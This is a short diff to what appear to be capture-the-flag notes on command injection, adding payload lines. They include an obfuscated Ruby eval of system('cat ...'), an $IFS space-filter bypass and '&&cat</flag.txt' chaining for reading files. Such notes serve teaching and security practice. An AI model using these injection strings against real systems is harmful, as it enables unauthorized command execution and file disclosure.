@@ -22,4 +22,6 @@ eval(''<<115<<121<<115<<116<<101<<109<<40<<39<<99<<97<<116<<32<<102<<108<<97<<10
 ```bash
 IFS - Internal Field Separator - defaults to a space, tab, newling character
 |cat${IFS}/flag.txt
+ls | xargs cat
+==1&&cat</flag.txt | "wa" is getting appended, first statement is false
 ```
